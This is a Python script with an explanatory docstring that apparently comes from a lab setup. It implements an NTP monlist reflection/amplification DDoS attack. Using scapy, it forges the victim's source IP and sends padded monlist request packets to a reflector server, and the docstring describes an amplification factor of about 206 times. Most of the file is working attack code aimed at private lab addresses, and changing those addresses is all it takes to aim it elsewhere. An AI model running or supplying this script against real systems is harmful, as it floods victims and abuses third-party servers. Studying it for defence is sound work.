"""
NTP (Network Time Protocol) amplification is a reflection attack that exploits the monlist command on vulnerable NTP servers.
The command is used to return the last 600 client IP addresses the server has communicated with, 
in which has a large response.

We spoof the source IP address with the victim's as with all reflector DDoS attacks, 
tricking the NTP server (reflector VM) into sending the large response to the victim.

A monlist response with 600 stored can be 206 times larger than the initial request.
Therefore an attacker with 1GB of internet traffic can deliver a 200GB+ attack.

The request is a raw, NTP control packet.

\x17\x00\x03\x2a - 4 bytes

Then we need to add padding, as the NTP server wont reply unless the request is over 60 bytes.
The padding is 61 bytes.

* Note: this attack would likely not work on modern NTP servers, as monlist has been disabled *

"""

from scapy.all import UDP, IP, send, Raw

# Config information:
victim_ip = "192.168.168.10" # testing-target ip
reflector_ip = "192.168.168.13" # reflector ip
dest_port = 123
num_packets = 100 # number of packets to send
padding_bytes = 61 


def main():
    print(f"Starting UDP flood: \nSending {num_packets} to {reflector_ip}:{dest_port}")

    for i in range(num_packets):

        packet = IP(src=victim_ip, dst=reflector_ip)/ UDP(
            dport=dest_port
        )/Raw(load=b"\x17\x00\x03\x2a" + b"\x00" * padding_bytes)

        send(packet, verbose=0)

    print(f"\nPackets sent successfully. Sent {num_packets} UDP packets.")


if __name__ == "__main__":
    main()